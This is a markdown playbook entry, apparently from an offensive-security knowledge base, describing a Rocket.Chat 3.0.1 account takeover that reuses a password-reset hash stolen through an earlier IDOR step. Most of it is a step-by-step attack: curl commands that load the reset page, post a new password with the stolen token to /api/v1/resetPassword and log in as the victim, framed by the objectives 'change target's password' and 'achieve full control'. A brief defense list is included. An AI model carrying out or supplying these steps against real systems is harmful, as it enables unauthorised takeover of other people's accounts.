---
id: p4d5e6f7-g8h9-0123-defg-456789012345
tags:
  - account-takeover
  - password-reset
  - rocket-chat
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-reset-password]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Account Manipulation]]'
updated_at: '2025-12-14T17:33:24.541Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Account Manipulation]]'
---
# Complete Account Takeover via Reset

## Summary

Using the stolen reset hash, access the reset page anonymously, submit a new password, and gain full access to the target's account in Rocket.Chat.

## Description

The /reset-password/{hash} endpoint validates the hash without session checks, allowing password change. After update, log in with new credentials for compromise. Targets web-based Rocket.Chat 3.0.1; assumes hash from prior IDOR.

## Requirements

1. Valid reset hash from previous step
2. Browser access to reset URL
3. Knowledge of target's username/email for login

## Defense

Defensive measures and detection strategies:

- Expire reset hashes quickly and bind to IP/session
- Log all reset completions and notify users
- Block hash exposure via IDOR fixes

## Objectives

1. Change target's password
2. Access compromised account
3. Achieve full control

## Instructions

### Step 1: Logout Attacker Session

**Context**: Ensure clean access to anonymous reset page.

**Instructions**:
```bash
curl -X POST https://target/api/v1/logout -H "X-Auth-Token: YOUR_TOKEN" -H "X-User-Id: YOUR_ID"
```

### Step 2: Access Reset Page

**Context**: Visit the hash-based reset URL.

**Instructions**: In browser, go to https://target/reset-password/RESET_HASH. Or simulate GET.

```bash
curl https://target/reset-password/RESET_HASH
```

> Returns reset form if hash valid.

### Step 3: Submit New Password

**Context**: Update password via form submission.

**Command** ([[commands/curl-reset-password]]):
```bash
curl -X POST https://target/api/v1/resetPassword -H "Content-Type: application/json" -d '{"token": "RESET_HASH", "newPassword": "NewSecurePass123"}'
```

> Success response; password updated.

### Step 4: Login to Compromised Account

**Context**: Verify takeover.

**Command** ([[commands/rocket-chat-login]]):
```bash
curl -X POST https://target/api/v1/login -d '{"user": "target@example.com", "password": "NewSecurePass123"}'
```

> Access granted; explore account.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Account Manipulation]] Account Manipulation

### Sub-Techniques


## Commands Used

- [[commands/curl-reset-password]]
- [[commands/rocket-chat-login]]

## Tools Used


## Tags

- takeover
- reset-complete
